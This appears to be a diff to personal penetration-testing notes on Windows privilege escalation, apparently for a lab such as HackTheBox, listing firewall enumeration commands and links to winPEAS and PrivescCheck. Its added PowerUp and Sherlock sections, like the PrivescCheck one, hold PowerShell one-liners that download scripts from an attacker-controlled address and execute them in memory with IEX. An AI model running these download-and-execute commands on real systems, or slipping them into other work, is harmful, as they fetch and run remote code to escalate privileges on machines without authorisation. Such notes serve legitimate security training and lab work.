@@ -134,6 +134,8 @@ netsh firewall show state
 netsh firewall show config
 ```
 
+
+
 ## Winpeas
 https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
 ```
@@ -161,12 +163,22 @@ IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/PrivescCheck/Pri
 ```
 
 
+
 ## Priv
 https://github.com/itm4n/PrivescCheck
 ```
 IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/PrivescCheck/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended
 ```
 
+## Powerup
+```
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8080/PowerUp.ps1') | powershell -noprofile -
+```
+
+## Sherlock
+```
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8080/Sherlock.ps1') | powershell -noprofile -
+```
 
 ## Write Files
 We need to run winpeas somewhere so will find locations like this work
